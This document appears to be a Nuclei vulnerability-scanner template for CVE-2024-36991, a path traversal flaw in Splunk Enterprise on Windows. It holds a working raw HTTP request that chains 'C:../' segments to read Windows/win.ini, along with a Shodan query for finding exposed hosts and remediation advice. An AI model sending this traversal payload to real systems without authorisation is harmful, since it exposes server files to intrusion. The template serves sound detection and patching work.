flow: http(1) && http(2)
http:
- host-redirects: true
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "Splunk Inc.")
    internal: true
    type: dsl
  raw:
  - 'GET /en-US/login HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - bit app support
    - fonts
    - extensions
  raw:
  - 'GET /en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Windows/win.ini
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-36991
info:
  author: DhiyaneshDK
  classification:
    epss-percentile: 0.99813
    epss-score: 0.93517
  description: 'In Splunk Enterprise on Windows versions below 9.2.2, 9.1.5, and 9.0.10,
    an attacker could perform a path traversal on the /modules/messaging/ endpoint
    in Splunk Enterprise on Windows. This vulnerability should only affect Splunk
    Enterprise on Windows.

    '
  impact: 'Attackers can perform path traversal to access sensitive filesystem locations
    on Splunk Enterprise for Windows.

    '
  metadata:
    max-request: 1
    shodan-query: html:"Login | Splunk"
    verified: true
  name: Splunk Enterprise - Local File Inclusion
  reference:
  - https://x.com/sheikhrishad0/status/1809210005125746880/photo/1
  - https://x.com/chybeta/status/1809249794122215557/photo/1
  - https://nvd.nist.gov/vuln/detail/CVE-2024-36991
  remediation: 'Update Splunk Enterprise to version 9.2.2, 9.1.5, or 9.0.10 or later.

    '
  severity: high
  tags: cve,cve2024,splunk,lfi,vkev,vuln
